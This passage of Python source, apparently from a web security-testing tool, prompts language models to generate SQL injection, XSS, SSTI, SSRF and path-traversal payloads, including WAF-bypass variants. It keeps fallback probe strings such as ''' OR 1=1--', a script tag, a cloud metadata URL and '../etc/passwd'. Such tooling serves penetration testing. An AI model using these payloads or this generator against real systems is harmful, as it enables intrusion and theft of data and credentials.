            framework:    Detected framework ("django", "spring", etc.)
            context:      Response text/error message for context
            waf_detected: WAF type if detected ("cloudflare", "modsec", etc.)
            num_payloads: How many payloads to generate

        Returns:
            List of generated payloads
        """
        # Get base payloads from library
        base_payloads = self.payload_library.get_payloads(
            attack_type, framework, top_n=5
        ) if hasattr(self.payload_library, '_library') else []

        prompt = self._build_prompt(
            attack_type=attack_type,
            framework=framework,
            context=context[:500],
            waf_detected=waf_detected,
            base_payloads=base_payloads[:5],
            num_payloads=num_payloads,
        )

        try:
            raw = self._call_llm(prompt)
            payloads = self._parse_response(raw)
            return payloads[:num_payloads]
        except Exception as e:
            console.print(f"  [yellow]LLM payload gen failed:[/yellow] {e}")
            # Fallback to library
            return base_payloads or self._fallback_payloads(attack_type)

    def _build_prompt(
        self,
        attack_type: str,
        framework: str,
        context: str,
        waf_detected: str,
        base_payloads: list[str],
        num_payloads: int,
    ) -> str:
        parts = [
            f"Generate {num_payloads} {attack_type} payloads for a {framework} application.",
        ]
        if context:
            parts.append(f"\nServer response context:\n{context}")
        if waf_detected:
            parts.append(f"\nWAF detected: {waf_detected}. Generate bypass variants.")
        if base_payloads:
            parts.append(f"\nKnown working payloads to build on:\n" + "\n".join(base_payloads))
        parts.append(f"\nReturn ONLY a JSON array of {num_payloads} payload strings.")
        return "\n".join(parts)

    def _call_llm(self, prompt: str) -> str:
        """Call LLM API and return raw text response."""
        if self.provider == "ollama":
            resp = self.client.post(
                f"{self.base_url}/api/generate",
                json={"model": self.model, "prompt": prompt, "stream": False,
                      "system": self.SYSTEM_PROMPT},
            )
            return resp.json().get("response", "[]")

        elif self.provider in ("anthropic", "openai"):
            headers = {
                "Content-Type": "application/json",
                "Authorization" if self.provider == "openai" else "x-api-key": self.api_key,
            }
            if self.provider == "anthropic":
                headers["anthropic-version"] = "2023-06-01"
                payload = {
                    "model": self.model,
                    "max_tokens": 1024,
                    "system": self.SYSTEM_PROMPT,
                    "messages": [{"role": "user", "content": prompt}],
                }
                url = "https://api.anthropic.com/v1/messages"
                resp = self.client.post(url, headers=headers, json=payload)
                return resp.json().get("content", [{}])[0].get("text", "[]")
            else:
                payload = {
                    "model": self.model,
                    "messages": [
                        {"role": "system", "content": self.SYSTEM_PROMPT},
                        {"role": "user",   "content": prompt},
                    ],
                }
                url  = "https://api.openai.com/v1/chat/completions"
                resp = self.client.post(url, headers=headers, json=payload)
                return resp.json()["choices"][0]["message"]["content"]

        raise ValueError(f"Unknown provider: {self.provider}")

    def _parse_response(self, raw: str) -> list[str]:
        """Parse LLM response into list of payload strings."""
        raw = raw.strip()
        # Extract JSON array
        match = re.search(r"\[.*\]", raw, re.DOTALL)
        if match:
            try:
                payloads = json.loads(match.group(0))
                return [str(p) for p in payloads if p]
            except Exception:
                pass
        # Fallback: line-by-line
        lines = [l.strip().strip('"\'') for l in raw.splitlines() if l.strip()]
        return [l for l in lines if len(l) > 2][:10]

    def _fallback_payloads(self, attack_type: str) -> list[str]:
        """Return generic fallback payloads if LLM fails."""
        fallbacks = {
            "sqli":           ["' OR '1'='1", "' OR 1=1--"],
            "xss":            ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"],
            "ssti":           ["{{7*7}}", "${7*7}"],
            "ssrf":           ["http://169.254.169.254/latest/meta-data/"],
            "path_traversal": ["../etc/passwd", "../../etc/passwd"],
        }
        return fallbacks.get(attack_type, [])
